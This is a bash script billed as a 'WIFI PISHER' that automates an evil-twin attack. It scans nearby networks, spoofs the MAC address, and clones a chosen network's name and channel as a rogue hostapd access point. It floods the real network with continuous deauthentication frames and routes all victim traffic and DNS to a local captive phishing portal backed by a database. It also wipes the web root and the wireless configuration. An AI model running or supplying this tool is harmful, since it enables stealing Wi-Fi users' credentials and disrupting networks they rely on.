#!/bin/bash

tempFolder=fakeap

titulo () {
	clear
	printf '\e[1;31m%-4s\e[m' "
            / -.
 	   /    -.
 	 O/       -.
	 |          -.
 	 /\            -.
	 \_\_             -.
       ########~~~~~~~~~~~~~~ WIFI PISHER by HACEFRESKO

"
}

selectNetworkInterface () {
	nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
	nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)

	if [ $nInterfaces -eq 1 ]
	then
		echo "[-] Configuring network interface..."
		if [ $nMonInterfaces -eq 0 ]
		then
                        tempInterface=$(airmon-ng | grep -oiE 'wlan[0-9]')
                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                        if [ "$tempStatus" != "enabled" ]
                        then
			        echo "[x] Network interface couldn't be put in monitor mode"
                               	ok=0
                        else
				interface="$tempInterface"mon
	                        ok=1
			fi
		else
			interface=$(airmon-ng | grep -oiE 'wlan[0-9]mon')
                        ok=1
		fi
	elif [ $nInterfaces -gt 1 ]
	then
		echo
		echo "Network interfaces:"
		echo
		line=4
		i=1

		interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
                printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
		while [ ${interface[$i]} ]
		do
			line=$(( $line + 1 ))
                       	i=$(( $i + 1 ))

			interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
			printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
			line=$(( $line + 1 ))
			i=$(( $i + 1 ))
		done
		echo
		echo -n "Select a network interface > "
		read op
		echo

		tempInterface=${interface[$op]}
		substring=$(echo $tempInterface | grep "mon")
		if [ $substring ]
		then
			interface="$tempInterface"
	                ok=1
		else
			tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
			if [ "$tempStatus" != "enabled" ]
			then
				echo "[x] Selected network interface couldn't be put in monitor mode"
				ok=0
			else
				interface="$tempInterface"mon
		                ok=1
			fi
		fi
	else
		echo "[x] No network interface found"
		ok=0
	fi

	if [ $ok -eq 1 ]
	then
		echo "[+] Network interface succesfully configured"
	fi
}

selectNetworkInterface2 () {
        nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
        nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)

        if [ $nInterfaces -eq 2 ]
        then
                if [ $nMonInterfaces -eq 1 ]
                then
                        tempInterface=$(airmon-ng | grep -oiwE 'wlan[0-9]')
                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                        if [ "$tempStatus" != "enabled" ]
                        then
                                echo "[x] Network interface couldn't be put in monitor mode"
                                ok=0
                        else
                                interface2="$tempInterface"mon
                                ok=1
                        fi
                else
                        interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 1p)
			if [ "$1" = "$interface2" ]
                        then
                                interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 2p)
                        fi
                        ok=1
                fi
        else
                echo "[x] Not enough network interfaces found (2)"
        fi

        if [ $ok -eq 1 ]
        then
                echo "[+] Network interface succesfully configured"
        fi

}

selectNetwork () {
        gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng"

        echo "[-] Press enter to stop scanning networks"
        read stop
        pkill airodump-ng

        num=$(grep "<wireless-network"  $tempFolder/temporal-01.kismet.netxml | wc -l)
        i=1
        j=1
        while [ $i -le $num ]
        do
                tbssid[$i]=$(grep BSSID  $tempFolder/temporal-01.kismet.netxml | sed -n "$i"p | cut -d ">" -f 2 | cut -d "<" -f 1)
                tessid[$i]=$(grep essid  $tempFolder/temporal-01.kismet.netxml | sed -n "$i"p | cut -d ">" -f 2 | cut -d "<" -f 1)

                valid=$(grep "<wireless" $tempFolder/temporal-01.kismet.netxml | cut -d "-" -f 2 | cut -d " " -f 1 | cut -d ">" -f 1 | sed -n "$j"p)

                while [ "$valid" == "client" ]
                do
                        j=$(( $j + 1 ))
                        valid=$(grep "<wireless" $tempFolder/temporal-01.kismet.netxml | cut -d "-" -f 2 | cut -d " " -f 1 | cut -d ">" -f 1 | sed -n "$j"p)
                done
                tchannel[$i]=$(grep channel  $tempFolder/temporal-01.kismet.netxml | sed -n "$j"p | cut -d ">" -f 2 | cut -d "<" -f 1)

                if [ -z "${tessid[$i]}" ]
                then
                        tessid[$i]="Unknown"
                fi
                i=$(( $i + 1 ))
                j=$(( $j + 1 ))
        done

        echo "WIFI NETWORKS"
        echo "Network interface: $interface"
        echo
        i=1
        while [ $i -le $num ]
        do
                printf  '%-5s %-2s %-17s %-1s %-2s %-1s %.44s\n'  "[$i]" "->" "${tbssid[$i]}" "|" "${tchannel[$i]}" "|" "${tessid[$i]}"
                i=$(( $i + 1 ))
        done

        echo
        read -p "Select a network > " network

        bssid=${tbssid[$network]}
        essid=${tessid[$network]}
        channel=${tchannel[$network]}
}

deauth(){
        if [ $ok -eq 1 ]
        then
		iwconfig "$interface2" channel "$2"
                echo
                echo "Press enter to deauth"
                read ola
                aireplay-ng -0 0 -a "$1" "$interface2"
        fi
}

selectNetworkInterface
if [ $ok -eq 1 ]
then

################################ PROGRAMS NEEDED ####################################

	echo "[-] Updating packages..."
	echo
	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal
	rm -r $tempFolder
	mkdir $tempFolder
	echo
	echo "[+] All packages updated"

######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################

	echo "[-] Flushing iptables..."
	iptables -F
	iptables -t nat -F
	echo "[+] Iptables flushed"

############################# POWER UP WI-FI INTERFACE ###############################

	echo "[-] Upgrading network interface..."
	ifconfig $interface down
	iw reg set US
	echo "[+] Network interface upgraded"

################################ CHANGE MAC ADDRESS ##################################

	echo "[-] Changing MAC address..."
	echo
	macchanger -r $interface
	ifconfig $interface up
	echo
	echo "[+] MAC address changed"

################################# HOSTAPD CONFIG #####################################

	op=-1
        while [ $op -lt 0 ] || [ $op -gt 2 ]
        do
                echo
                echo "Select an option:"
                echo "[1] -> Create new Wi-Fi acces point"
                echo "[2] -> Intercept existing access point"
                read -p "> " op
		echo

                if [ $op -lt 0 ] || [ $op -gt 2 ]
                then
                        echo "[x] Please, select a valid option: "
                fi
        done

        if [ $op -eq 1 ]
        then
                deauth=0
                read -p "Wifi essid > " essid
                read -p "Channel > " channel
        elif [ $op -eq 2 ]
        then
                deauth=1
                selectNetwork
        fi


        op=-1
	echo
        echo "Security: "
        while [ $op -lt 0 ] || [ $op -gt 2 ]
        do
                echo "[1] -> Open"
                echo "[2] -> WPA2"
                read -p "> " op
		echo

                if [ $op -lt 1 ] || [ $op -gt 2 ]
                then
                        echo "Please, select a valid option: "
                fi
        done

        if [ $op -eq 1 ]
        then

                echo "interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf

        elif [ $op -eq 2 ]
        then

        read -p "Wifi password [more than 8 chars]> " pass
	echo

        echo "interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf

        fi

	gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel"
	clear

########################## DNSMASQ CONFIG (DNS & DHCP) ###############################

	# Stops dnsmasq daemon on port 53
	service dnsmasq stop

	# Checks for Internet connection
	conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')

	if [ $conex -lt 100 ]
	then

		echo "interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf

		# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION

		# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

		# Everything going out this machine goes by eth0 and masqued
		iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE

	else

		echo "interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1
address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf

	fi

	# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
	# (.htaccess) can reffer directly to the domain name in the URL
	echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts

	ifconfig $interface 10.0.0.1

	gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP"

################################### WEB FILES #########################################

	rm -r /var/www/html/*
	cp -r captive /var/www/html/captive
	cp .htaccess /var/www/html
	chmod 777 /var/www/html/.htaccess
	chmod 777 /var/www/html/captive
	chmod 777 /var/www/html/captive/*

	cp -f override.conf /etc/apache2/conf-available/

	# Enables rewrite and override for .htaccess
	a2enconf override
	a2enmod rewrite

	# Removes previous wireless configuration
	rm -rf /etc/wpa_supplicant/wpa_supplicant.conf

	service apache2 reload
	service apache2 restart
	service mysql start

	if [ $deauth -eq 1 ]
        then
                export -f deauth
                export -f selectNetworkInterface2
		export $bssid
		export $channel
		export $interface
                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"selectNetworkInterface2 \"$interface\"; deauth \"$bssid\" \"$channel\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
		export -f titulo
		gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
	else
		export -f titulo
		gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
        fi

	rm -r $tempFolder

	clear
fi
